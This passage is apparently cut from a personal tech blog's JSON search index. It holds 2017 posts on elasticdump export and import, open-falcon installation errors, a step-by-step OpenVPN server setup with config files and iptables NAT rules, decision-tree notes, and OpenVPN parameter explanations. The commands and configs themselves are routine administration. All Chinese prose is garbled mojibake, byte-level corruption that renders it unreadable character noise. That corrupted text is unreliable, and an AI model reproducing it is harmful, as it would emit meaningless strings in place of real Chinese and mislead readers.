http.server","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¤§æ•°æ® sql å¹³å° impala","slug":"history/tech/596ea8b05a209ca30c8a60b9","date":"2017-07-19T00:32:48.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596ea8b05a209ca30c8a60b9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596ea8b05a209ca30c8a60b9/","excerpt":"","text":"impala","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"devops å·¥å…·","slug":"history/tech/596ea8925a209ca30c8a60b8","date":"2017-07-19T00:32:18.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596ea8925a209ca30c8a60b8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596ea8925a209ca30c8a60b8/","excerpt":"","text":"chef, puppet, saltstack, ansible","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"es æ•°æ®å¯¼å‡º","slug":"history/tech/596f119c5a209ca30c8a60ba","date":"2017-07-18T20:00:28.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596f119c5a209ca30c8a60ba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596f119c5a209ca30c8a60ba/","excerpt":"","text":"æ–¹æ¡ˆ1ï¼šhttps://github.com/taskrabbit/elasticsearch-dumpæ–¹æ¡ˆ2ï¼šhttps://github.com/medcl/elasticsearch-migrationè¿™é‡Œä½¿ç”¨æ–¹æ¡ˆ1ï¼ˆæ–¹æ¡ˆ2æŠ¥é”™æ²¡æ—¶é—´ç ”ç©¶äº†ï¼‰å®‰è£… elasticdumpnpm install elasticdump -g å¯¼å‡ºï¼šelasticdump --input=http://192.168.1.100:9200/test --output=./my_index.json --type=data å¯¼å…¥ï¼šelasticdump --input=./my_index.json --output=http://192.168.1.100:9200/test --type=data","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"open-falcon æŠ˜è…¾è®°å½•","slug":"history/tech/596e23795a209ca30c8a60b7","date":"2017-07-18T03:04:25.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596e23795a209ca30c8a60b7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596e23795a209ca30c8a60b7/","excerpt":"","text":"Open-Falconçš„å¼€æºç¤¾åŒº:å®˜ç½‘: http://open-falcon.orgGithub: https://github.com/open-falconQQè®¨è®ºç»„: 373249123 / 516088946 / 469342415å¾®ä¿¡å…¬ä¼—å·: OpenFalcon falcon-plus å®‰è£…æŒ‰ç…§å®˜æ–¹æ–‡æ¡£æ“ä½œæŠ¥é”™ï¼šMakefile:47: recipe for target 'graph' failed falcon issue åœ°å€ï¼šhttps://github.com/open-falcon/falcon-plus/issues/169 è§£å†³æ–¹æ¡ˆï¼šgit clone https://github.com/open-falcon/rrdlite $GOPATH/src/github.com/open-falcon/rrdlite è®¾ç½®ç«¯å£ï¼švim /usr/local/open-falcon/api/config/cfg.json &quot;web_port&quot;: &quot;0.0.0.0:8060&quot; Dashboard å®‰è£…æŠ¥é”™ï¼š Modules/errors.h:8:18: fatal error: lber.h: No such file or directory compilation terminated. error: command 'x86_64-linux-gnu-gcc' failed with exit status 1 è§£å†³ï¼šapt install ldap-auth-config apt-get install libldap2-dev apt-get install libsasl2-dev æµ‹è¯•ç¯å¢ƒè®¾ç½®ç«¯å£ï¼švim wsgi.py app.run(host=&quot;0.0.0.0&quot;, port=8061, debug=True) æ­£å¼ç¯å¢ƒï¼švim gunicorn.conf bind = ':8061' æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°å¯†ç ï¼Œåæ¥å‘ç°å³ä¸Šè§’æœ‰ä¸ªæ³¨å†Œï¼Œæ³¨å†Œåå³å¯ç™»å½•ã€‚æ¥å…¥ openldap æŠ¥é”™ï¼šSimpleLDAPObject has no attribute '_l' æ˜å¤©æ¥ç€æŠ˜è…¾ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸­æ–‡æ–‡æ¡£https://www.gitbook.com/book/laiwei/open-falcon/details","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu å®‰è£… openVPN æœåŠ¡ç«¯","slug":"history/tech/596e17535a209ca30c8a60b6","date":"2017-07-18T02:12:35.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596e17535a209ca30c8a60b6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596e17535a209ca30c8a60b6/","excerpt":"","text":"å®‰è£…openvpnapt-get update apt-get install openvpn apt install easy-rsa é…ç½®æœåŠ¡å™¨ åˆå§‹åŒ–æœåŠ¡ç«¯gzip -d /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/ cp -r /usr/share/easy-rsa/* /etc/openvpn é…ç½®PKIcd /etc/openvpn/ vim vars æ‰¾åˆ°â€œexport KEY_SIZE=â€è¿™è¡Œï¼Œæ ¹æ®æƒ…å†µæŠŠ1024æ”¹æˆ2048æˆ–è€…4096å†å®šä½åˆ°æœ€åé¢ï¼Œä¼šçœ‹åˆ°ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„export KEYCOUNTRY=&quot;US&quot; export KEYPROVINCE=&quot;CA&quot; export KEYCITY=&quot;SanFrancisco&quot; export KEYORG=&quot;Fort-Funston&quot; export &lt;KEY_EMAIL=&quot;me@myhost.mydomain&quot;&gt; è¿™ä¸ªè‡ªå·±æ ¹æ®æƒ…å†µæ”¹ä¸€ä¸‹ï¼Œä¸æ”¹ä¹Ÿå¯ä»¥è¿è¡Œã€‚å…¶å®ä¸æ”¹varsè¿™ä¸ªæ–‡ä»¶ï¼Œvpnä¹Ÿå¯ä»¥è·‘èµ·æ¥ã€‚ä¾‹å¦‚ï¼šexport KEYCOUNTRY=&quot;CN&quot; export KEYPROVINCE=&quot;SH&quot; export KEYCITY=&quot;Shanghai&quot; export KEYORG=&quot;ds-mc.cn&quot; export &lt;KEY_EMAIL=&quot;xxx@ds-mc.cn&quot;&gt; æ³¨ï¼šåœ¨åé¢ç”ŸæˆæœåŠ¡ç«¯caè¯ä¹¦æ—¶ï¼Œè¿™é‡Œçš„é…ç½®ä¼šä½œä¸ºç¼ºçœé…ç½®ä¿®æ”¹varsæ–‡ä»¶å¯æ‰§è¡Œå¹¶è°ƒç”¨chmod +x vars äº§ç”Ÿè¯ä¹¦ äº§ç”ŸCAè¯ä¹¦source ./vars NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/keysæ³¨ï¼šä¹Ÿå°±æ˜¯å¦‚æœæ‰§è¡Œ./clean-allï¼Œå°±ä¼šæ¸…ç©º/etc/openvpn/keysä¸‹æ‰€æœ‰æ–‡ä»¶å¼€å§‹é…ç½®è¯ä¹¦ï¼šæ¸…ç©ºåŸæœ‰è¯ä¹¦./clean-all æ³¨ï¼šä¸‹é¢è¿™ä¸ªå‘½ä»¤åœ¨ç¬¬ä¸€æ¬¡å®‰è£…æ—¶å¯ä»¥è¿è¡Œï¼Œä»¥ååœ¨æ·»åŠ å®Œå®¢æˆ·ç«¯åæ…ç”¨ï¼Œå› ä¸ºè¿™ä¸ªå‘½ä»¤ä¼šæ¸…é™¤æ‰€æœ‰å·²ç»ç”Ÿæˆçš„è¯ä¹¦å¯†é’¥ï¼Œå’Œä¸Šé¢çš„æç¤ºå¯¹åº”ç”ŸæˆæœåŠ¡å™¨ç«¯caè¯ä¹¦./build-ca æ³¨ï¼šç”±äºä¹‹å‰åšè¿‡ç¼ºçœé…ç½®ï¼Œè¿™é‡Œä¸€è·¯å›è½¦å³å¯äº§ç”ŸæœåŠ¡å™¨è¯ä¹¦./build-key-server openvpn.ds-mc.cn ç”ŸæˆDHéªŒè¯æ–‡ä»¶./build-dh ç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦./build-key client1 ï¼ˆåå­—ä»»æ„ï¼Œå»ºè®®å†™æˆä½ è¦å‘ç»™çš„äººçš„å§“åï¼Œæ–¹ä¾¿ç®¡ç†ï¼‰æ³¨ï¼šè¿™é‡Œä¸ç”ŸæˆæœåŠ¡ç«¯è¯ä¹¦é…ç½®ç±»ä¼¼ï¼Œä¸­é—´ä¸€æ­¥æç¤ºè¾“å…¥æœåŠ¡ç«¯å¯†ç ï¼Œå…¶ä»–æŒ‰ç…§ç¼ºçœæç¤ºä¸€è·¯å›è½¦å³å¯ã€‚ç”Ÿæˆta.keyæ–‡ä»¶openvpn --genkey --secret /etc/openvpn/keys/ta.key ç¼–è¾‘æœåŠ¡é…ç½®æ–‡ä»¶vim /etc/openvpn/server.conf # è®¾ç½®ç›‘å¬IPï¼Œé»˜è®¤æ˜¯ç›‘å¬æ‰€æœ‰IP ;local a.b.c.d # è®¾ç½®ç›‘å¬ç«¯å£ï¼Œå¿…é¡»è¦å¯¹åº”çš„åœ¨é˜²ç«å¢™é‡Œé¢æ‰“å¼€ port 1194 # è®¾ç½®ç”¨TCPè¿˜æ˜¯UDPåè®®ï¼Ÿ ;proto tcp proto tcp # è®¾ç½®åˆ›å»ºtunçš„è·¯ç”±IPé€šé“ï¼Œè¿˜æ˜¯åˆ›å»ºtapçš„ä»¥å¤ªç½‘é€šé“ï¼Œç”±äºè·¯ç”±IPå®¹æ˜“æ§åˆ¶ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨tunnelï¼› # ä½†å¦‚æœå¦‚IPXç­‰å¿…é¡»ä½¿ç”¨ç¬¬äºŒå±‚æ‰èƒ½é€šè¿‡çš„é€šè®¯ï¼Œåˆ™å¯ä»¥ç”¨tapæ–¹å¼ï¼Œtapä¹Ÿå°±æ˜¯ä»¥å¤ªç½‘æ¡¥æ¥ ;dev tap dev tun # è¿™é‡Œæ˜¯é‡ç‚¹ï¼Œå¿…é¡»æŒ‡å®šSSL/TLS root certificate (ca), # certificate(cert), and private key (key) # caæ–‡ä»¶æ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å¿…é¡»ä½¿ç”¨çš„ï¼Œä½†ä¸éœ€è¦ca.key # æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯æŒ‡å®šå„è‡ªçš„.crtå’Œ.key # è¯·æ³¨æ„è·¯å¾„,å¯ä»¥ä½¿ç”¨ä»¥é…ç½®æ–‡ä»¶å¼€å§‹ä¸ºæ ¹çš„ç›¸å¯¹è·¯å¾„, # ä¹Ÿå¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„ # è¯·å°å¿ƒå­˜æ”¾.keyå¯†é’¥æ–‡ä»¶ ca keys/ca.crt cert keys/openvpn.example.com.crt key keys/openvpn.example.com.key # This file should be kept secret # æŒ‡å®šDiffie hellman parameters. (é»˜è®¤æ˜¯2048ï¼Œå¦‚æœç”Ÿæˆcaçš„æ—¶å€™ä¿®æ”¹è¿‡dhå‚æ•°&quot;export KEY_SIZE&quot;ï¼Œåˆ™æ”¹ä¸ºå¯¹åº”çš„æ•°å­—) dh keys/dh1024.pem # é…ç½®VPNä½¿ç”¨çš„ç½‘æ®µï¼ŒOpenVPNä¼šè‡ªåŠ¨æä¾›åŸºäºè¯¥ç½‘æ®µçš„DHCPæœåŠ¡ï¼Œä½†ä¸èƒ½å’Œä»»ä½•ä¸€æ–¹çš„å±€åŸŸç½‘æ®µé‡å¤ï¼Œä¿è¯å”¯ä¸€ server 10.8.0.0 255.255.255.0 # ç»´æŒä¸€ä¸ªå®¢æˆ·ç«¯å’Œvirtual IPçš„å¯¹åº”è¡¨ï¼Œä»¥æ–¹ä¾¿å®¢æˆ·ç«¯é‡æ–°è¿æ¥å¯ä»¥è·å¾—åŒæ ·çš„IP ifconfig-pool-persist ipp.txt # ä¸ºå®¢æˆ·ç«¯åˆ›å»ºå¯¹åº”çš„è·¯ç”±,ä»¥å¦å…¶é€šè¾¾å…¬å¸ç½‘å†…éƒ¨æœåŠ¡å™¨ # ä½†è®°ä½ï¼Œå…¬å¸ç½‘å†…éƒ¨æœåŠ¡å™¨ä¹Ÿéœ€è¦æœ‰å¯ç”¨è·¯ç”±è¿”å›åˆ°å®¢æˆ·ç«¯ ;push &quot;route 192.168.20.0 255.255.255.0&quot; push &quot;route 10.X.0.0 255.255.0.0&quot; ï¼ˆå…¶ä¸­XæŒ‰ç…§æœºæˆ¿çš„ç½‘æ®µä¿®æ”¹ï¼‰ # è‹¥å®¢æˆ·ç«¯å¸Œæœ›æ‰€æœ‰çš„æµé‡éƒ½é€šè¿‡VPNä¼ è¾“,åˆ™å¯ä»¥ä½¿ç”¨è¯¥è¯­å¥ # å…¶ä¼šè‡ªåŠ¨æ”¹å˜å®¢æˆ·ç«¯çš„ç½‘å…³ä¸ºVPNæœåŠ¡å™¨,æ¨èå…³é—­ # ä¸€æ—¦è®¾ç½®ï¼Œè¯·å°å¿ƒæœåŠ¡ç«¯çš„DHCPè®¾ç½®é—®é¢˜ ;push &quot;redirect-gateway def1 bypass-dhcp&quot; # ç”¨OpenVPNçš„DHCPåŠŸèƒ½ä¸ºå®¢æˆ·ç«¯æä¾›æŒ‡å®šçš„DNSã€WINSç­‰ ;push &quot;dhcp-option DNS 208.67.222.222&quot; ;push &quot;dhcp-option DNS 208.67.220.220&quot; # é»˜è®¤å®¢æˆ·ç«¯ä¹‹é—´æ˜¯ä¸èƒ½ç›´æ¥é€šè®¯çš„ï¼Œé™¤éæŠŠä¸‹é¢çš„è¯­å¥æ³¨é‡Šæ‰ client-to-client # ä¸‹é¢æ˜¯ä¸€äº›å¯¹å®‰å…¨æ€§å¢å¼ºçš„æªæ–½ # For extra security beyond that provided by SSL/TLS, create an &quot;HMAC firewall&quot; # to help block DoS attacks and UDP port flooding. # # Generate with: # openvpn --genkey --secret ta.key # # The server and each client must have a copy of this key. # The second parameter should be 0 on the server and 1 on the clients. ;tls-auth ta.key 0 # This file is secret (è¿™å¥è¦æ³¨é‡Šæ‰) # ä½¿ç”¨lzoå‹ç¼©çš„é€šè®¯,æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å¿…é¡»é…ç½® comp-lzo # è¾“å‡ºçŸ­æ—¥å¿—,æ¯åˆ†é’Ÿåˆ·æ–°ä¸€æ¬¡,ä»¥æ˜¾ç¤ºå½“å‰çš„å®¢æˆ·ç«¯ status /var/log/openvpn/openvpn-status.log # ç¼ºçœæ—¥å¿—ä¼šè®°å½•åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œä½†ä¹Ÿå¯ä»¥å¯¼å‘åˆ°å…¶ä»–åœ°æ–¹ # å»ºè®®è°ƒè¯•çš„ä½¿ç”¨å…ˆä¸è¦è®¾ç½®,è°ƒè¯•å®Œæˆåå†å®šä¹‰ log /var/log/openvpn/openvpn.log log-append /var/log/openvpn/openvpn.log # è®¾ç½®æ—¥å¿—çš„çº§åˆ« # # 0 is silent, except for fatal errors # 4 is reasonable for general usage # 5 and 6 can help to debug connection problems # 9 is extremely verbose verb 3 ä¸‹é¢æ˜¯ server.conf çš„å®é™…é…ç½®æ–‡ä»¶port 1194 proto udp dev tun ca keys/ca.crt cert keys/openvpn.ds-mc.cn.crt key keys/openvpn.ds-mc.cn.key dh keys/dh2048.pem server 192.168.66.0 255.255.255.0 push &quot;route 10.0.177.0 255.255.255.0&quot; ifconfig-pool-persist ipp.txt client-to-client keepalive 10 20 duplicate-cn comp-lzo persist-key persist-tun status /var/log/openvpn/openvpn-status.log log /var/log/openvpn/openvpn.log log-append /var/log/openvpn/openvpn.log verb 3 crl-verify /etc/openvpn/keys/crl.pem å¯åŠ¨æœåŠ¡service openvpn start æˆ–è€…/etc/init.d/openvpn start å¦‚æœé­é‡å¯åŠ¨å¤±è´¥çš„æƒ…å†µï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ ä¸Šä¸€è¡Œlog-append openvpn.logå†å°è¯•å¯åŠ¨ï¼Œç„¶ååˆ°/var/log/openvpn/æ£€æŸ¥openvpn.logæ–‡ä»¶æ¥æŸ¥çœ‹é”™è¯¯å‘ç”ŸåŸå› ã€‚å¼€å¯è·¯ç”±è½¬å‘åŠŸèƒ½vim /etc/sysctl.conf net.ipv4.ip_forward = 1 sysctl -p è®¾ç½®iptablesï¼ˆè¿™ä¸€æ¡è‡³å…³é‡è¦ï¼Œé€šè¿‡é…ç½®natå°†vpnç½‘æ®µIPè½¬å‘åˆ°serverå†…ç½‘ï¼‰iptables -t nat -A POSTROUTING -s 10.20.0.0/24 -o eth0 -j MASQUERADE è®¾ç½®openvpnç«¯å£é€šè¿‡iptables -A INPUT -p UDP --dport 1194 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT è¿™è¾¹éœ€è¦æ³¨æ„çš„æ˜¯Debian/Ubuntuä¸Šiptablesæ˜¯ä¸ä¼šä¿å­˜è§„åˆ™çš„ã€‚éœ€è¦æŒ‰å¦‚ä¸‹æ­¥éª¤è¿›è¡Œé…ç½®ï¼Œè®©ç½‘å¡å…³é—­æ—¶ä¿å­˜iptablesè§„åˆ™ï¼Œå¯åŠ¨æ—¶åŠ è½½iptablesè§„åˆ™ï¼šåˆ›å»º/etc/network/if-post-down.d/iptables æ–‡ä»¶vim /etc/network/if-post-down.d/iptables #!/bin/bash iptables-save &gt; /etc/iptables.rules chmod +x /etc/network/if-post-down.d/iptables åˆ›å»º/etc/network/if-pre-up.d/iptables æ–‡ä»¶vim /etc/network/if-pre-up.d/iptables #!/bin/bash iptables-restore &lt; /etc/iptables.rules chmod +x /etc/network/if-pre-up.d/iptables å®¢æˆ·ç«¯é…ç½®å°†æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„keyï¼ˆca.crtï¼Œclient.crtï¼Œclient.keyï¼‰ä¸‹è½½åˆ°æœ¬åœ°ã€‚è¿›å…¥å®¢æˆ·ç«¯OpenVPNç›®å½•ï¼Œå°†sample-configä¸‹çš„client.ovpnæ–‡ä»¶å¤åˆ¶åˆ°configç›®å½•ï¼Œclientç«¯åšç›¸åº”çš„ä¿®æ”¹ï¼šclient dev tun proto udp remote xxx.xxx.xxx.xxx 1194 ca ca.crt cert xxx.crt key xxx.key ;tls-auth ta.key 0 (è¿™å¥è¦æ³¨é‡Šæ‰) comp-lzo user nobody group nobody persist-key persist-tun Windowså®¢æˆ·ç«¯ä¸‹è½½åœ°å€ï¼šhttp://openvpn.net/index.php/download.htmlhttp://swupdate.openvpn.org/community/releases/openvpn-2.2.2-install.exeå°†keyå’Œæ–°å»ºçš„client.ovpnæ”¾åˆ°C:/Program Files/OpenVPN/configç›®å½•ä¸‹ï¼Œåˆ°æ¡Œé¢åŒå‡»openvpnå›¾æ ‡å³å¯ã€‚Macå®¢æˆ·ç«¯https://code.google.com/p/tunnelblick/1.æ‰“å¼€Tunnelblick2.ç‚¹å‡»å·¦ä¸‹è§’+3.æˆ‘æœ‰è®¾ç½®æ–‡ä»¶4.OpenVPNè®¾ç½®5.æ‰“å¼€ç§äººè®¾ç½®æ–‡ä»¶å¤¹6.å°†keyå’Œæ–°å»ºçš„client.ovpnæ”¾åˆ°æ­¤ç›®å½•ä¸‹Linuxå®¢æˆ·ç«¯apt install openvpn openvpn --daemon --config client.ovpn","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å†³ç­–æ ‘ä¸éšæœºæ£®æ—","slug":"history/tech/596d30425a209ca30c8a60b2","date":"2017-07-17T21:46:42.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596d30425a209ca30c8a60b2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596d30425a209ca30c8a60b2/","excerpt":"","text":"ä¿¡æ¯ç†µç†µï¼Œè”åˆç†µï¼Œæ¡ä»¶ç†µï¼Œäº’ä¿¡æ¯å†³ç­–æ ‘ä¿¡æ¯å¢ç›ŠID3ã€C4.5ã€CART(classification and Regression Tree)Bagging ä¸éšæœºæ£®æ—CARTclassification &amp; Regression Treeæ ‘çš„æ·±åº¦è¿‡æ·±å®¹æ˜“è¿‡æ‹Ÿåˆè”åˆæ¦‚ç‡ è¾¹ç¼˜æ¦‚ç‡php å†³ç­–æ ‘","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"openvpn é…ç½®å‚æ•°","slug":"history/tech/596d2cd45a209ca30c8a60b1","date":"2017-07-17T21:32:04.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596d2cd45a209ca30c8a60b1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596d2cd45a209ca30c8a60b1/","excerpt":"","text":"æœåŠ¡ç«¯ server.conf é…ç½®æ–‡ä»¶:#openvpnçš„é»˜è®¤ç›‘å¬ç«¯å£ port 1194 #é»˜è®¤ä½¿ç”¨çš„åè®® proto udp #é‡‡ç”¨è·¯ç”±æ¨¡å¼ï¼Œä¸è¿‡ä½¿ç”¨çš„å´æ˜¯tap dev tap #éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦æ˜¯å¦åˆæ³• ca /etc/openvpn/easy-rsa/2.0/keys/ca.crt #serverç«¯ä½¿ç”¨çš„è¯ä¹¦ cert /etc/openvpn/easy-rsa/2.0/keys/server.crt key /etc/openvpn/easy-rsa/2.0/keys/server.key #dhæ–‡ä»¶ dh /etc/openvpn/easy-rsa/2.0/keys/dh1024.pem #è®¾å®šserverç«¯è™šæ‹Ÿå‡ºæ¥çš„ç½‘æ®µ server 10.8.9.0 255.255.255.0 #é˜²æ­¢Openvpn é‡å¯åå¿˜è®°clientç«¯æ›¾ç»ä½¿ç”¨è¿‡çš„IPåœ°å€ ifconfig-pool-persist ipp.txt #ç»™å®¢æˆ·ç«¯pushä¸€æ¡è·¯ç”± push &quot;route 192.168.250.0 255.255.255.0&quot; #å®¢æˆ·ç«¯æ‰€åœ¨çš„å­ç½‘ç½‘æ®µ route 10.1.1.0 255.255.255.0 #Natåé¢ä½¿ç”¨VPNï¼Œå¦‚æœé•¿æ—¶é—´ä¸é€šä¿¡ï¼ŒNAT session å¯èƒ½ä¼šå¤±æ•ˆï¼Œå¯¼è‡´vpnè¿æ¥ä¸¢å¤±ã€‚#æ‰€æœ‰keepaliveæä¾›ä¸€ä¸ªç±»ä¼¼pingçš„æœºåˆ¶ï¼Œæ¯10ç§’é€šè¿‡vpnçš„controlé€šé“pingå¯¹æ–¹ï¼Œ #å¦‚æœ120ç§’æ— æ³•pingé€šï¼Œåˆ™è®¤ä¸ºä¸¢å¤±ï¼Œå¹¶é‡å¯vpn,é‡æ–°è¿æ¥ã€‚ keepalive 10 120 #å¯ä»¥è®©vpnçš„clientä¹‹é—´äº’ç›¸è®¿é—®ï¼Œç›´æ¥é€šè¿‡openvpnç¨‹åºè½¬å‘ client-to-client #å…è®¸å¤šä¸ªå®¢æˆ·ç«¯ä½¿ç”¨åŒä¸€ä¸ªè¯ä¹¦è¿æ¥æœåŠ¡ç«¯ duplicate-cn #å¯¹æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œæ³¨æ„serverå’Œclient ä¸€è‡´ comp-lzo #é€šè¿‡keepaliveæ£€æµ‹è¶…æ—¶åï¼Œé‡æ–°å¯åŠ¨vpnï¼Œä¸é‡æ–°è¯»å–keys,ä¿ç•™ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„keys persist-key #é€šè¿‡keepaliveæ£€æµ‹è¶…æ—¶å,é‡æ–°å¯åŠ¨vpn,ä¸€ç›´ä¿æŒtunæˆ–tapè®¾å¤‡æ˜¯linkupçš„ï¼Œå¦åˆ™ç½‘ç»œè¿æ¥ä¼šå…ˆlinkdownç„¶ålinkup persist-tun #æŠŠopenvpnçš„çŠ¶æ€å†™å…¥æ—¥å¿—ä¸­ status openvpn-status.log #openvpnçš„log log openvpn.log #openvpné‡å¯åä¼šåˆ é™¤logå†…å®¹ï¼Œlog-appendåˆ™æ˜¯è¿½åŠ logå†…å®¹ï¼Œå¹¶ä¸åˆ é™¤ã€‚ log-append openvpn.log #æ—¥å¿—è®°å½•çº§åˆ« verb 5 å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶:vi /etc/openvpn/client.conf #æŒ‡å®šopenvpnä¸ºå®¢æˆ·ç«¯ client dev tap proto udp #openvpnæœåŠ¡ç«¯çš„IPåœ°å€å’Œç«¯å£ï¼Œå¦‚æœæœ‰å¤šå°æœåŠ¡ç«¯åšè´Ÿè½½å‡è¡¡ï¼Œåˆ™å¯ä»¥å‡ºç°å¤šä¸ª#remote remote 10.1.1.174 1194 #å§‹ç»ˆé‡æ–°è§£æServerçš„IPåœ°å€ï¼Œå¦‚æœremoteåé¢è·Ÿçš„æ˜¯åŸŸåï¼Œä¿è¯Server IPåœ°å€æ˜¯åŠ¨#æ€çš„ä½¿ç”¨DDNSåŠ¨æ€æ›´æ–°DNSåï¼ŒClientåœ¨è‡ªåŠ¨é‡æ–°è¿æ¥æ—¶é‡æ–°è§£æServerçš„IPåœ°å€ï¼Œè¿™#æ ·æ— éœ€äººä¸ºé‡æ–°å¯åŠ¨ï¼Œå³å¯é‡æ–°æ¥å…¥VPN resolv-retry infinite #åœ¨æœ¬æœºä¸ç»‘å®šä»»ä½•ç«¯å£ç›‘å¬è¿›å…¥çš„æ•°æ® nobind persist-key persist-tun ca ca.crt cert client.crt key client.key ns-cert-type server comp-lzo verb 3 é’ˆå¯¹å¤šä¸ªå®¢æˆ·ç«¯çš„OpenVPN 2.0 çš„å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ç¤ºä¾‹ ############################################# # é’ˆå¯¹å¤šä¸ªå®¢æˆ·ç«¯çš„OpenVPN 2.0 çš„å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ç¤ºä¾‹ # # è¯¥é…ç½®æ–‡ä»¶å¯ä»¥è¢«å¤šä¸ªå®¢æˆ·ç«¯ä½¿ç”¨ï¼Œå½“ç„¶æ¯ä¸ªå®¢æˆ·ç«¯éƒ½åº”è¯¥æœ‰è‡ªå·±çš„è¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶ # # åœ¨Windowsä¸Šæ­¤é…ç½®æ–‡ä»¶çš„åç¼€åº”è¯¥æ˜¯&quot;.ovpn&quot;ï¼Œåœ¨Linux/BSDç³»ç»Ÿä¸­åˆ™æ˜¯&quot;.conf&quot; ############################################## # æŒ‡å®šè¿™æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å°†ä»æœåŠ¡å™¨è·å–æŸäº›é…ç½®æ–‡ä»¶æŒ‡ä»¤ client # åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œé™¤éä½ éƒ¨åˆ†ç¦ç”¨æˆ–è€…å®Œå…¨ç¦ç”¨äº†TUN/TAPæ¥å£çš„é˜²ç«å¢™ï¼Œå¦åˆ™VPNå°†ä¸èµ·ä½œç”¨ã€‚ ;dev tap dev tun # 